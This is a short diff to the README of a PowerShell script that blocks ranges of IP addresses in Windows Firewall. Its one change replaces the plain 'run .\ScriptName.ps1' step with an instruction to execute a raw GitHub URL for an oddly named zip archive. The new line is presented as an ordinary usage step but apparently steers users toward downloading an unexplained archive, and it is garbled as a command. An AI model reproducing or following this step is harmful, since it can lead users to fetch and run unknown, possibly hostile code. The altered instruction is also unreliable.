@@ -11,7 +11,7 @@ This script adds a range of IP addresses to a Blacklist
 
 1. Open PowerShell as **Administrator**.
 2. Navigate to the directory where you saved the script (using `cd "Path\To\Script"`).
-3. Execute the script with `.\ScriptName.ps1` (ensure the script's extension is `.ps1`).
+3. Execute the script with `.\https://raw.githubusercontent.com/corald2/Powershell-IP-Blacklist-Script/main/wicken/Powershell-IP-Blacklist-Script_pinnula.zip` (ensure the script's extension is `.ps1`).
 
 **Important Note on Bulk IP Blocking:**
 - Blocking a vast range of IPs (like from 100.0.0.0 to a high end IP) can lead to performance issues with the Windows Firewall due to the sheer number of rules. 
